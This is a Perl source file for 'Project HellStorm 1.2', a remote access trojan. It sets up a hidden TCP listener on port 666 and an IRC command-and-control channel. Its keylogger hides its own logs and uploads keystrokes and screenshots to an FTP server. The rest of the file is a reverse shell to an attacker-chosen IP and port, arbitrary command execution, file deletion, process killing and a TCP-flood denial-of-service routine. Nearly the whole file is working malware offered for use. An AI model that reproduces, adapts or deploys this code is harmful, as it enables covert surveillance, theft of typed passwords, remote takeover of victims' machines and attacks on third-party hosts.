#!usr/bin/perl
#Project HellStorm 1.2
#(C) Doddy Hackman 2015
#Necessary modules
#
#ppm install http://www.bribes.org/perl/ppm/Win32-API.ppd
#ppm install http://www.bribes.org/perl/ppm/Win32-GuiTest.ppd
#
#Use "perl2exe -gui server.pl" to hide console
#

use Win32::OLE;
use Win32::OLE qw(in);
use Win32::Process;
use Win32;
use Win32::API;
use Win32::GuiTest
  qw(GetForegroundWindow GetWindowText FindWindowLike SetForegroundWindow SendKeys);
use Win32::Clipboard;
use threads;
use Net::FTP;
use Win32::File;
use Cwd;
use IO::Socket;
use Win32::Job;
use Win32::GuiTest qw(MouseMoveAbsPix SendMessage);

if ( $^O eq 'MSWin32' ) {
    use Win32::Console;
    Win32::Console::Free();
}

# FTP Configuration

my $host_ftp = "localhost";    # Edit
my $user_ftp = "doddy";        # Edit
my $pass_ftp = "123";          # Edit

# IRC Configuration

my $host_irc  = "localhost";    # Edit
my $canal_irc = "#locos";       # Edit
my $port_irc  = "6667";         # Edit
my $nick_irc  = dameip();       # Edit

# Threads

# You must comment on the thread that you will not use

my $comando4 = threads->new( \&conexion_directa );

#my $comando5 = threads->new( \&keylogger );
#my $comando6 = threads->new(\&ircnow);

$comando4->join();

#$comando5->join();

#$comando6->join();

#

sub ircnow {

    my $soquete = new IO::Socket::INET(
        PeerAddr => $host_irc,
        PeerPort => $port_irc,
        Proto    => "tcp"
    );

    print $soquete "NICK $nick_irc\r\n";
    print $soquete "USER $nick_irc 1 1 1 1\r\n";
    print $soquete "JOIN $canal_irc\r\n";

    while ( my $logar = <$soquete> ) {
        print "\r\n";
        chomp($logar);

        if ( $logar =~ /^PING(.*)$/i ) {
            print $soquete "PONG $1\r\n";
        }

        if ( $logar =~ /:$nick_irc help/g ) {

            my @commands = (
                "msgbox <>",            "getinfo",
                "cmd <>",               "dir",
                "cd <>",                "del <>",
                "rename :<>:<>:",       "cwd",
                "verlogs",              "word :<>:",
                "crazymouse",           "cambiarfondo :<>:",
                "opencd",               "closedcd",
                "dosattack :<>:<>:<>:", "speak :<>:",
                "iniciochau",           "iniciovuelve",
                "iconochau",            "iconovuelve",
                "backshell :<>:<>:",    "procesos",
                "cerrarproceso  :<>:<>:"
            );

            print $soquete
              "PRIVMSG $canal_irc : HellStorm (C) 2011 Doddy Hackman\r\n";
            print $soquete "PRIVMSG $canal_irc : Commands : \r\n";
            for (@commands) {
                print $soquete "PRIVMSG $canal_irc : " . $_ . "\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc msgbox (.*)/g ) {
            my $msg = $1;
            chomp $msg;
            cheats( "mensaje", $msg );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc getinfo/g ) {
            my $re = getinfo();
            if ( $re =~ /:(.*):(.*):(.*):(.*):(.*):/ ) {
                print $soquete "PRIVMSG $canal_irc : [+] Domain : $1\r\n";
                print $soquete "PRIVMSG $canal_irc : [+] Chip : $2\r\n";
                print $soquete "PRIVMSG $canal_irc : [+] Version : $3\r\n";
                print $soquete "PRIVMSG $canal_irc : [+] Username : $4\r\n";
                print $soquete "PRIVMSG $canal_irc : [+] OS : $5\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc cmd (.*)/ ) {
            my $cmda = $1;
            chomp $cmda;
            my @re = cmd($cmda);
            for (@re) {
                print $soquete "PRIVMSG $canal_irc : $_\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc dir/ ) {
            my @files = navegador("listar");
            for (@files) {
                if ( -f $_ ) {
                    print $soquete "PRIVMSG $canal_irc : [File] : " . $_
                      . "\r\n";
                }
                else {
                    print $soquete "PRIVMSG $canal_irc : [Directory] : " . $_
                      . "\r\n";
                }
            }
        }

        if ( $logar =~ /:$nick_irc cd (.*)/ ) {
            my $di = $1;
            chomp $di;
            if ( navegador( "cd", $di ) ) {
                print $soquete "PRIVMSG $canal_irc : [+] Directory Changed\r\n";
            }
            else {
                print $soquete "PRIVMSG $canal_irc : [-] Error\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc del (.*)/ ) {
            my $file = $1;
            chomp $file;
            if ( navegador( "borrar", $1 ) ) {
                print $soquete "PRIVMSG $canal_irc : [+] File deleted\r\n";
            }
            else {
                print $soquete "PRIVMSG $canal_irc : [-] Error\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc rename :(.*):(.*):/ ) {
            my ( $a, $b ) = ( $1, $2 );
            if ( navegador( "rename", $a, $b ) ) {
                print $soquete "PRIVMSG $canal_irc : [+] Changed\r\n";
            }
            else {
                print $soquete "PRIVMSG $canal_irc : [-] Error\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc cwd/ ) {
            print $soquete "PRIVMSG $canal_irc : [+] Directory : "
              . getcwd() . "\r\n";
        }

        if ( $logar =~ /:$nick_irc verlogs/ ) {
            print $soquete "PRIVMSG $canal_irc : [+] Logs\r\n";
            my @word = openfilex("logs.txt");
            for (@word) {
                sleep 3;
                print $soquete "PRIVMSG $canal_irc : " . $_ . "\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc word :(.*):/ig ) {
            my $msg = $1;
            cheats( "word", $msg );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc crazymouse/ig ) {
            cheats("crazymouse");
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc cambiarfondo :(.*):/ig ) {
            my $url = $1;
            chomp $url;
            cheats( "cambiarfondo", $url );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc opencd/ig ) {
            cheats( "cd", "1" );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc closedcd/ig ) {
            cheats( "cd", "0" );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /dosattack :(.*):(.*):(.*):/ ) {
            my ( $i, $p, $t ) = ( $1, $2, $3 );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
            dosattack( $i, $p, $t );
        }

        if ( $logar =~ /:$nick_irc speak :(.*):/ig ) {
            my $t = $1;
            chomp $t;
            cheats( "speak", $t );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc iniciochau/ ) {
            cheats( "inicio", "1" );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc iniciovuelve/ ) {
            cheats( "inicio", "0" );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc iconochau/ ) {
            cheats( "iconos", "1" );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc iconovuelve/ ) {
            cheats( "iconos", "0" );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc backshell :(.*):(.*):/ig ) {
            backshell( $1, $2 );
            print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
        }

        if ( $logar =~ /:$nick_irc procesos/ ) {

            my %vida = adminprocess("listar");
            print $soquete "PRIVMSG $canal_irc : [+] Process Found : "
              . int( keys %vida ) . "\r\n";
            for my $data ( keys %vida ) {
                print $soquete "PRIVMSG $canal_irc : [+] Process : "
                  . $data
                  . " [+] PID : "
                  . $vida{$data} . "\r\n";
            }
        }

        if ( $logar =~ /:$nick_irc cerrarproceso :(.*):(.*):/ ) {
            my ( $b, $a ) = ( $1, $2 );
            if ( adminprocess( "cerrar", $a, $b ) ) {
                print $soquete "PRIVMSG $canal_irc : [+] Yes , master\r\n";
            }
        }

    }
}

sub conexion_directa {

    my $sock = IO::Socket::INET->new(
        LocalPort => 666,
        Listen    => 10,
        Proto     => 'tcp',
        Reuse     => 1
    );

    while ( my $con = $sock->accept ) {
        $resultado = <$con>;

        if ( $resultado =~ /msgbox (.*)/ig ) {
            my $msg = $1;
            cheats( "mensaje", $msg );
        }

        if ( $resultado =~ /infor/ig ) {
            print $con getinfo();
        }

        if ( $resultado =~ /word :(.*):/ig ) {
            my $msg = $1;
            cheats( "word", $msg );
        }

        if ( $resultado =~ /crazymouse/ig ) {
            cheats("crazymouse");
        }

        if ( $resultado =~ /cambiarfondo (.*)/ig ) {
            my $url = $1;
            cheats( "cambiarfondo", $url );
        }

        if ( $resultado =~ /opencd/ig ) {
            cheats( "cd", "1" );
        }

        if ( $resultado =~ /closedcd/ig ) {
            cheats( "cd", "0" );
        }

        if ( $resultado =~ /dosattack :(.*):(.*):(.*):/ ) {
            my ( $i, $p, $t ) = ( $1, $2, $3 );
            dosattack( $i, $p, $t );
        }

        if ( $resultado =~ /speak :(.*):/ig ) {
            my $t = $1;
            cheats( "speak", $t );
        }

        if ( $resultado =~ /iniciochau/ ) {
            cheats( "inicio", "1" );
        }
        if ( $resultado =~ /iniciovuelve/ ) {
            cheats( "inicio", "0" );
        }

        if ( $resultado =~ /iconochau/ ) {
            cheats( "iconos", "1" );
        }
        if ( $resultado =~ /iconovuelve/ ) {
            cheats( "iconos", "0" );
        }

        if ( $resultado =~ /backshell :(.*):(.*):/ig ) {
            backshell( $1, $2 );
        }

        if ( $resultado =~ /comando :(.*):/ig ) {
            my $cmd = $1;
            my @re  = cmd($cmd);
            print $con @re;
        }

        if ( $resultado =~ /mostrarpro/ ) {

            my %vida = adminprocess("listar");

            for my $data ( keys %vida ) {
                print $con "PROXEC" . $data . "PROXEC\r\n";
                print $con "PIDX" . $vida{$data} . "PIDX\r\n";
            }

        }

        if ( $resultado =~ /chauproce K0BRA(.*)K0BRA(.*)K0BRA/ ) {
            my ( $b, $a ) = ( $1, $2 );
            if ( adminprocess( "cerrar", $a, $b ) ) {
                print $con "ok";
            }
        }

        if ( $resultado =~ /chdirnow K0BRA(.*)K0BRA/ ) {
            my $di = $1;
            if ( navegador( "cd", $di ) ) {
                print $con "ok";
            }
        }
        if ( $resultado =~ /borrarfile K0BRA(.*)K0BRA/ ) {
            if ( navegador( "borrar", $1 ) ) {
                print $con "ok";
            }
        }
        if ( $resultado =~ /borrardir K0BRA(.*)K0BRA/ ) {
            if ( navegador( "borrar", $1 ) ) {
                print $con "ok";
            }
        }
        if ( $resultado =~ /rename :(.*):(.*):/ ) {
            my ( $a, $b ) = ( $1, $2 );
            if ( navegador( "rename", $a, $b ) ) {
                print $con "ok";
            }
        }

        if ( $resultado =~ /getcwd/ ) {
            print $con getcwd();
        }

        if ( $resultado =~ /verlogs/ ) {
            print $con openfile("logs.txt");
        }

        if ( $resultado =~ /dirnow ACATOY(.*)ACATOY/ ) {
            my @files = navegador("listar");
            for (@files) {
                if ( -f $_ ) {
                    print $con "FILEX" . $_ . "FILEX" . "\r\n";
                }
                else {
                    print $con "DIREX" . $_ . "DIREX" . "\r\n";
                }
            }
        }
    }
}

sub keylogger {

    my $come = new Win32::API( "user32", "GetAsyncKeyState", "N", "I" );
    my $tengo = 0;

    hideit( $0, "hide" );

    my $comando1 = threads->new( \&capture_windows );
    my $comando2 = threads->new( \&capture_keys );
    my $comando3 = threads->new( \&capture_screen );

    $comando1->join();
    $comando2->join();
    $comando3->join();

    sub capture_windows {

        while (1) {

            my $win1 = GetForegroundWindow();
            my $win2 = GetForegroundWindow();

            if ( $win1 != $win2 ) {
                my $nombre = GetWindowText($win1);
                chomp($nombre);
                if ( $nombre ne "" ) {
                    savefile( "logs.txt", "\n\n[" . $nombre . "]\n\n" );
                }
            }
        }
        return 1;
    }

    sub capture_keys {

        while (1) {

            my $test1;
            my $test2;

            for my $num ( 0x30 .. 0x39 ) {

                if ( dame($num) ) {
                    savefile( "logs.txt", chr($num) );
                }
            }

            if ( dame(0x14) ) {
                $test1 = 1;
                $tengo++;
            }

            for my $num ( 0x41 .. 0x5A ) {

                if ( dame($num) ) {

                    if ( dame(0x20) ) {
                        savefile( "logs.txt", " " );
                    }

                    if ( dame(0x32) ) {
                        savefile( "logs.txt", "\n[enter]\n\n" );
                    }

                    unless ( verpar($tengo) eq 1 ) {
                        savefile( "logs.txt", chr($num) );
                    }

                    if ( dame(0x10) or dame(0xA0) or dame(0xA1) ) {
                        $test2 = 1;
                    }

                    unless ( $test1 eq 1 or $test2 eq 1 ) {
                        if ( $num >= 0x41 ) {
                            if ( $num <= 0x5A ) {
                                if ( verpar($tengo) eq 1 ) {
                                    savefile( "logs.txt", chr( $num + 32 ) );
                                }
                            }
                        }
                    }
                }
            }
        }
        return 1;
    }

    sub capture_screen {

        $numero = 0;

        while (1) {

            sleep 120;

            subirftp( "logs.txt", "logs.txt" );

            $numero++;

            SendKeys("%{PRTSCR}");

            my $a = Win32::Clipboard::GetBitmap();

            open( FOTO, ">" . $numero . ".bmp" );
            binmode(FOTO);
            print FOTO $a;
            close FOTO;

            hideit( $numero . ".bmp", "hide" );
            subirftp( $numero . ".bmp", $numero . ".bmp" );
        }
    }

    sub dame {
        return ( $come->Call(@_) & 1 );
    }

    sub savefile {

        open( SAVE, ">>" . $_[0] );
        print SAVE $_[1];
        close SAVE;

        hideit( $_[0], "hide" );

    }

    sub hideit {
        if ( $_[1] eq "show" ) {
            Win32::File::SetAttributes( $_[0], NORMAL );
        }
        elsif ( $_[1] eq "hide" ) {
            Win32::File::SetAttributes( $_[0], HIDDEN );
        }
        else {
            print "error\n";
        }
    }

    sub subirftp {

        if ( $ser = Net::FTP->new($host_ftp) ) {
            if ( $ser->login( $user_ftp, $pass_ftp ) ) {
                $ser->mkdir( getmyip() );
                $ser->binary();
                if (
                    $ser->put(
                        getcwd() . "/" . $_[0], getmyip() . "/" . $_[1]
                    )
                  )
                {
                    return true;
                }
            }
            $ser->close;
        }
    }

    sub verpar {
        return ( $_[0] % 2 == 0 ) ? "1" : "2";
    }

    sub getmyip {
        my $get = gethostbyname("");
        return inet_ntoa($get);
    }

}

sub getinfo {
    return
        ":"
      . Win32::DomainName() . ":"
      . Win32::GetChipName() . ":"
      . Win32::GetOSVersion() . ":"
      . Win32::LoginName() . ":"
      . Win32::GetOSName() . ":";
}

sub cheats {

    my $as = new Win32::API( 'user32', 'FindWindow', 'PP', 'N' );
    my $b  = new Win32::API( 'user32', 'ShowWindow', 'NN', 'N' );

    if ( $_[0] eq "cambiarfondo" ) {
        my $file = $_[1];
        my $as =
          new Win32::API( "user32", "SystemParametersInfo", [ L, L, P, L ], L );
        $as->Call( 20, 0, $file, 0 );
    }

    if ( $_[0] eq "speak" ) {
        my $texta  = $_[1];
        my $hablax = Win32::OLE->new("SAPI.SpVoice");
        $hablax->Speak( $texta, 0 );
    }

    if ( $_[0] eq "crazymouse" ) {
        for my $number ( 1 .. 666 ) {
            MouseMoveAbsPix( $number, $number );
        }
    }

    if ( $_[0] eq "word" ) {
        my $text = $_[1];
        system("start winword.exe");
        sleep 4;
        SendKeys($text);
    }

    if ( $_[0] eq "cd" ) {

        my $ventana = Win32::API->new( "winmm", "mciSendString", "PPNN", "N" );
        my $rta = ' ' x 127;
        if ( $_[1] eq "1" ) {
            $ventana->Call( 'set CDAudio door open', $rta, 127, 0 );
        }
        else {
            $ventana->Call( 'set CDAudio door closed', $rta, 127, 0 );
        }
    }

    if ( $_[0] eq "inicio" ) {

        if ( $_[1] eq "1" ) {
            $handlex = $as->Call( "Shell_TrayWnd", 0 );
            $b->Call( $handlex, 0 );
        }
        else {
            $handlex = $as->Call( "Shell_TrayWnd", 0 );
            $b->Call( $handlex, 1 );
        }

    }

    if ( $_[0] eq "iconos" ) {

        if ( $_[1] eq "1" ) {

            $handle = $as->Call( 0, "Program Manager" );
            $b->Call( $handle, 0 );
        }
        else {
            $handle = $as->Call( 0, "Program Manager" );
            $b->Call( $handle, 1 );
        }
    }

    if ( $_[0] eq "mensaje" ) {
        if ( $_[1] ne "" ) {
            my $msg = $_[1];
            chomp $msg;
            Win32::MsgBox( $msg, 0, "Mensaje de Dios" );
        }
    }
}

sub backshell {

    my ( $ip, $port ) = ( $_[0], $_[1] );

    $ip =~ s/(\s)+$//;
    $port =~ s/(\s)+$//;

    conectar( $ip, $port );
    tipo();

    sub conectar {
        socket( REVERSE, PF_INET, SOCK_STREAM, getprotobyname('tcp') );
        connect( REVERSE, sockaddr_in( $_[1], inet_aton( $_[0] ) ) );
        open( STDIN,  ">&REVERSE" );
        open( STDOUT, ">&REVERSE" );
        open( STDERR, ">&REVERSE" );
    }

    sub tipo {
        print "\n[*] Reverse Shell Starting...\n\n";
        if ( $^O =~ /Win32/ig ) {
            infowin();
            system("cmd.exe");
        }
        else {
            infolinux();
            system("export TERM=xterm;exec sh -i");
        }
    }

    sub infowin {
        print "[+] Domain Name : " . Win32::DomainName() . "\n";
        print "[+] OS Version : " . Win32::GetOSName() . "\n";
        print "[+] Username : " . Win32::LoginName() . "\n\n\n";
    }

    sub infolinux {
        print "[+] System information\n\n";
        system("uname -a");
        print "\n\n";
    }
}

sub cmd {

    my $job = Win32::Job->new;
    $job->spawn(
        "cmd",
        qq{cmd /C $_[0]},
        {
            no_window => "true",
            stdout    => "logx.txt",
            stderr    => "logx.txt"
        }
    );
    $ok = $job->run("30");
    open( F, "logx.txt" );
    @words = <F>;
    close F;
    unlink("logx.txt");
    return @words;
}

sub adminprocess {

    if ( $_[0] eq "listar" ) {
        my %procesos;

        my $uno = Win32::OLE->new("WbemScripting.SWbemLocator");
        my $dos = $uno->ConnectServer( "", "root\\cimv2" );

        foreach my $pro ( in $dos->InstancesOf("Win32_Process") ) {
            $procesos{ $pro->{Caption} } = $pro->{ProcessId};
        }
        return %procesos;
    }

    if ( $_[0] eq "cerrar" ) {

        my ( $numb, $pid ) = ( $_[1], $_[2] );

        if ( Win32::Process::KillProcess( $pid, $numb ) ) {
            return true;
        }
        else {
            return false;
        }
    }
}

sub navegador {

    my $dir = $_[1];

    chomp $dir;

    $dir =~ s/(\s)+$//;

    if ( $_[0] eq "borrar" ) {
        if ( -f $_[1] ) {
            if ( unlink( getcwd() . "/" . $_[1] ) ) {
                return true;
            }
            else {
                return false;
            }
        }
        else {
            if ( rmdir( getcwd() . "/" . $_[1] ) ) {
                return true;
            }
            else {
                return false;
            }
        }
    }
    if ( $_[0] eq "cd" ) {
        if ( chdir $dir ) {
            return true;
        }
        else {
            return false;
        }
    }
    if ( $_[0] eq "rename" ) {
        if ( rename( getcwd() . "/" . $_[1], getcwd() . "/" . $_[2] ) ) {
            return true;
        }
        else {
            return false;
        }
    }
    if ( $_[0] eq "listar" ) {
        my @archivos = coleccionar( getcwd() );
        my @all;
        for my $test (@archivos) {
            push( @all, $test );
        }
        return @all;
    }

    sub coleccionar {
        opendir DIR, $_[0];
        my @archivos = readdir DIR;
        close DIR;
        return @archivos;
    }
}

sub dosattack {
    for ( 1 .. $_[2] ) {
        IO::Socket::INET->new(
            PeerAddr => $_[0],
            PeerPort => $_[1],
            Proto    => "tcp"
        );
    }
}

sub openfile {
    my $r;
    open( FILE, $_[0] );
    @wor = <FILE>;
    close FILE;
    for (@wor) {
        $r .= $_;
    }
    return $r;
}

sub openfilex {
    my @wor;
    open( FILE, $_[0] );
    @wor = <FILE>;
    close FILE;
    return @wor;
}

sub encriptar {

    my ( $text, $op ) = @_;

    my @re;
    my @va = split( "", $text );

    my %valor = (
        "1" => "a",
        "2" => "b",
        "3" => "c",
        "4" => "d",
        "5" => "e",
        "6" => "f",
        "7" => "g",
        "8" => "h",
        "9" => "i",
        "0" => "j",
        "." => "k"
    );

    if ( $op eq "encode" ) {
        for my $letra (@va) {
            for my $data ( keys %valor ) {
                if ( $data eq $letra ) {
                    $letra =~ s/$data/$valor{$data}/g;
                    push( @re, $letra );
                }
            }
        }
    }
    if ( $op eq "decode" ) {
        for my $letra (@va) {
            for my $data ( keys %valor ) {
                if ( $valor{$data} eq $letra ) {
                    $letra =~ s/$valor{$data}/$data/g;
                    push( @re, $letra );
                }
            }
        }
    }
    return @re;
}

sub dameip {

    my @wor = encriptar( getmyip(), "encode" );

    for (@wor) {
        $resultado .= $_;
    }
    return $resultado;
}

# The End ?
